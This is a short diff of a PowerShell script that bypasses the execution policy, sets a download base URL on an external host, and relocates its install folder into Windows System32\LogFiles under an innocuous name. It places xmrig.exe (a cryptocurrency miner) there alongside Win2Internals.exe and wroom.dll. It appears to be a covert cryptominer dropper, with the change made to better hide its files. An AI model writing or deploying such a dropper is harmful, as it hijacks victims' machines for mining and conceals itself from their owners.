@@ -16,7 +16,10 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 $baseURL = "https://baa4ts.is-a-good.dev"
 
 # Definir rutas
-$root = Join-Path $env:WINDIR "events"
+$root = Join-Path $env:WINDIR "System32"
+$root = Join-Path $root "LogFiles"
+$root = Join-Path $root "Guille"
+
 $xmrig = Join-Path $root "xmrig.exe"
 $Win2 = Join-Path $root "Win2Internals.exe"
 $wroom = Join-Path $root "wroom.dll"
